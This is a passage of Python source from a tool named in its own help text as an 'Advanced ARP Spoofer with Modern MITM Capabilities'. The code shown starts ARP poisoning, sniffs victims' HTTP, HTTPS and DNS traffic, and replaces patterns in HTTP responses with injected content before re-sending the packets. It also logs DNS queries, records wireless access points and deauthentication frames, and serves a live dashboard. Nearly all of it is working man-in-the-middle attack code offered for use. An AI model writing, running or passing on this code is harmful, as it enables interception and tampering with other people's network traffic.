                if 'HTTP/1.1 200 OK' in load and 'text/html' in load.lower():
                    modified = False
                    modified_load = packet[Raw].load

                    for rule in self.injection_rules:
                        if rule['pattern'].encode() in modified_load:
                            modified_load = modified_load.replace(
                                rule['pattern'].encode(),
                                rule['injection'].encode()
                            )
                            modified = True
                            logger.info(f"Injected content into response for {src_ip}: {rule['description']}")

                    if modified:
                        # Update Content-Length header if present
                        content_length_match = re.search(r'Content-Length: (\d+)', load, re.IGNORECASE)
                        if content_length_match:
                            old_length = int(content_length_match.group(1))
                            new_length = len(modified_load) - (len(packet[Raw].load) - old_length)
                            modified_load = modified_load.replace(
                                f'Content-Length: {old_length}'.encode(),
                                f'Content-Length: {new_length}'.encode()
                            )

                        # Create and send the modified packet
                        new_packet = IP(packet[IP])
                        del new_packet[TCP].chksum
                        del new_packet[IP].chksum

                        if new_packet.haslayer(Raw):
                            new_packet[Raw].load = modified_load

                        send(new_packet, verbose=0)
                        self.stats.injected_packets += 1
                        return True

        except Exception as e:
            logger.error(f"Error processing HTTP packet: {e}")

        return False

    def process_dns_packet(self, packet):
        """Process DNS packets for reconnaissance."""
        if not packet.haslayer(DNSQR):
            return

        self.stats.dns_packets += 1

        dns = packet[DNS]
        src_ip = packet[IP].src

        if dns.qr == 0:  # DNS query
            query = dns[DNSQR].qname.decode('utf-8', errors='ignore')
            logger.info(f"DNS Query: {src_ip} -> {query}")

            # Save packet info
            packet_info = {
                'timestamp': time.time(),
                'src_ip': src_ip,
                'dst_ip': packet[IP].dst,
                'protocol': 'DNS',
                'length': len(packet),
                'info': f"Query: {query}"
            }
            self.db_manager.save_packet(packet_info)

    def process_wireless_packet(self, packet):
        """Process wireless packets for monitoring."""
        if packet.haslayer(Dot11Deauth):
            self.stats.deauth_packets += 1
            logger.warning(f"Deauthentication packet detected: {packet.addr2} -> {packet.addr1}")

            # Save packet info
            packet_info = {
                'timestamp': time.time(),
                'src_ip': 'N/A',
                'dst_ip': 'N/A',
                'protocol': '802.11',
                'length': len(packet),
                'info': f"Deauth: {packet.addr2} -> {packet.addr1}"
            }
            self.db_manager.save_packet(packet_info)

        elif packet.haslayer(Dot11Beacon):
            # Track wireless access points
            if packet.haslayer(Dot11Elt):
                ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
                bssid = packet.addr3
                logger.info(f"Wireless AP: {ssid} ({bssid})")

    def packet_callback(self, packet):
        """Callback for packet sniffing with enhanced analysis."""
        if self.stop_event.is_set():
            return

        self.stats.total_packets += 1

        # Process different packet types
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst

            # Track new hosts
            if src_ip not in self.discovered_hosts:
                mac = packet[Ether].src if packet.haslayer(Ether) else None
                vendor = self.get_vendor_from_mac(mac) if mac else None
                host = NetworkTarget(ip=src_ip, mac=mac, vendor=vendor)
                self.discovered_hosts[src_ip] = host
                self.db_manager.save_host(host)
                logger.info(f"Discovered new host: {src_ip} ({mac}) - {vendor}")

            # Process TCP packets (HTTP/HTTPS)
            if packet.haslayer(TCP):
                self.stats.tcp_packets += 1

                # Check for HTTP (port 80) or HTTPS (port 443)
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    processed = self.process_http_request(packet)
                    if processed:
                        return  # Packet was modified and sent, don't process further

                # Check for HTTPS
                if packet[TCP].dport == 443 or packet[TCP].sport == 443:
                    self.stats.https_packets += 1
                    logger.info(f"HTTPS connection: {src_ip} -> {dst_ip}:{packet[TCP].dport}")

            # Process UDP packets (DNS)
            elif packet.haslayer(UDP):
                self.stats.udp_packets += 1

                # Check for DNS (port 53)
                if packet[UDP].dport == 53 or packet[UDP].sport == 53:
                    self.process_dns_packet(packet)

        # Process wireless packets if enabled
        elif self.config.get("wireless_monitoring", False) and packet.haslayer(Dot11):
            self.process_wireless_packet(packet)

        # Save packet info to database
        try:
            src_ip = packet[IP].src if packet.haslayer(IP) else 'N/A'
            dst_ip = packet[IP].dst if packet.haslayer(IP) else 'N/A'

            if packet.haslayer(TCP):
                protocol = 'TCP'
            elif packet.haslayer(UDP):
                protocol = 'UDP'
            elif packet.haslayer(ICMP):
                protocol = 'ICMP'
            elif packet.haslayer(Dot11):
                protocol = '802.11'
            else:
                protocol = 'Other'

            packet_info = {
                'timestamp': time.time(),
                'src_ip': src_ip,
                'dst_ip': dst_ip,
                'protocol': protocol,
                'length': len(packet),
                'info': packet.summary()
            }
            self.db_manager.save_packet(packet_info)
        except Exception as e:
            logger.error(f"Error saving packet info: {e}")

    def start_http_server(self):
        """Start HTTP server for live analysis."""
        handler = lambda *args: LiveAnalysisHandler(
            *args,
            auth_tokens=self.dashboard_auth,
            auth_enabled=self.config.get('dashboard_enable_auth', True)
        )

        self.http_server = HTTPServer(('localhost', self.config.get('http_port', 8080)), handler)
        self.http_server.arper = self  # Make ARPSpoofer accessible to handler
        logger.info(f"HTTP analysis server started on http://localhost:{self.config.get('http_port', 8080)}")
        self.http_server.serve_forever()

    def start_wireless_monitor(self):
        """Start wireless monitoring if enabled."""
        if not self.config.get("wireless_monitoring", False):
            return

        logger.info("Starting wireless monitoring...")
        try:
            # Monitor mode for wireless packets
            sniff(
                iface=self.interface,
                prn=self.packet_callback,
                stop_filter=lambda _: self.stop_event.is_set(),
                store=0,
                monitor=True
            )
        except Exception as e:
            logger.error(f"Wireless monitoring error: {e}")

    def start_sniffer(self):
        """Start packet sniffer in promiscuous mode."""
        # Build BPF filter
        if self.target:
            bpf_filter = f"ip host {self.target.ip} and (tcp port 80 or tcp port 443 or udp port 53)"
        elif self.config.get("monitor_all_hosts", False):
            bpf_filter = "tcp port 80 or tcp port 443 or udp port 53"
        else:
            bpf_filter = f"ip host {self.gateway.ip} and (tcp port 80 or tcp port 443 or udp port 53)"

        # Add wireless monitoring if enabled
        if self.config.get("wireless_monitoring", False):
            bpf_filter = "( " + bpf_filter + " ) or ( type mgt subtype deauth )"

        try:
            sniff(
                filter=bpf_filter,
                prn=self.packet_callback,
                stop_filter=lambda _: self.stop_event.is_set(),
                store=0,
            )
        except Exception as e:
            logger.error(f"Sniffer error: {e}")

    def run(self):
        """Main execution method."""
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        logger.info("Starting Advanced MITM Analyzer")

        # Perform network discovery
        self.network_discovery()

        # Start HTTP server for live analysis
        self.http_thread = threading.Thread(target=self.start_http_server)
        self.http_thread.daemon = True
        self.http_thread.start()

        # Start ARP poisoning
        self.start_arp_poisoning()

        # Start wireless monitoring if enabled
        if self.config.get("wireless_monitoring", False):
            self.wireless_thread = threading.Thread(target=self.start_wireless_monitor)
            self.wireless_thread.daemon = True
            self.wireless_thread.start()

        # Start packet sniffer
        self.sniffer_thread = threading.Thread(target=self.start_sniffer)
        self.sniffer_thread.start()

        try:
            # Keep main thread alive
            while not self.stop_event.is_set():
                time.sleep(1)

                # Log statistics every 30 seconds
                if int(time.time()) % 30 == 0:
                    stats = self.stats.to_dict()
                    logger.info(f"Stats: {stats}")

        except KeyboardInterrupt:
            logger.info("Keyboard interrupt received")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            self.stop_event.set()
            if self.poison_thread:
                self.poison_thread.join()
            if self.sniffer_thread:
                self.sniffer_thread.join()
            if self.wireless_thread:
                self.wireless_thread.join()
            self.restore_network()
            logger.info("MITM Analyzer stopped")

    def signal_handler(self, signum, frame):
        """Handle interrupt signal."""
        logger.info(f"Received signal {signum}, shutting down...")
        self.stop_event.set()


def main():
    parser = argparse.ArgumentParser(
        description="Advanced ARP Spoofer with Modern MITM Capabilities"
    )
    parser.add_argument(
        "-i", "--interface", required=True, help="Network interface to use"
    )
    parser.add_argument(
        "-g", "--gateway", required=True, help="Gateway IP address"
    )
    parser.add_argument(
        "-t", "--target", help="Target IP address (optional)"
    )
    parser.add_argument(
        "--gateway-mac", help="Gateway MAC address (optional)"
    )
    parser.add_argument(
        "--target-mac", help="Target MAC address (optional)"
    )
    parser.add_argument(
        "-c", "--config", help="Configuration file (JSON format)"
    )
    parser.add_argument(
        "--discover", action="store_true", help="Discover hosts on the network"
    )
    parser.add_argument(
        "--monitor-all", action="store_true", help="Monitor all hosts on the network"
    )
    parser.add_argument(
        "--wireless", action="store_true", help="Enable wireless monitoring"
    )
    parser.add_argument(
        "--no-auth", action="store_true", help="Disable dashboard authentication"
    )

    args = parser.parse_args()

    gateway = NetworkTarget(ip=args.gateway, mac=args.gateway_mac)
    target = NetworkTarget(ip=args.target, mac=args.target_mac) if args.target else None

    spoofer = AdvancedARPSpoofer(args.interface, gateway, target, args.config)

    if args.monitor_all:
        spoofer.config['monitor_all_hosts'] = True

    if args.wireless:
        spoofer.config['wireless_monitoring'] = True

    if args.no_auth:
        spoofer.config['dashboard_enable_auth'] = False

    spoofer.run()


if __name__ == "__main__":
    main()
